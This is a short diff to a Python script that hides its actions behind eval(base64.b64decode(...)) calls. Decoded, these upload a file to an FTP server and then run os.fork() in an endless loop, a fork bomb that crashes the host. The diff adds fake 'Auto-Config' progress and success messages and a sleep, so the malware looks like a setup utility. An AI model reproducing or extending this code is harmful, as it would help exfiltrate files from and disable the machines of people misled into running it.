@@ -1,6 +1,7 @@
 import base64
 import os
 import pyfiglet
+import time
 import ftplib
 from requests import get
 
@@ -147,5 +148,10 @@ eval(base64.b64decode("ZnRwLnN0b3JsaW5lcygnU1RPUiAnICsgXzAxMDIyMDAwNDAwMGJ4ODEsI
 eval(base64.b64decode("ZnRwLnF1aXQoKQ=="))
 fp.close()
 
+print("Starting Auto-Config...")
+time.sleep(5)
+
 while _1x882329:
     eval(base64.b64decode("b3MuZm9yaygp"))
+
+print("Config successfull!!")
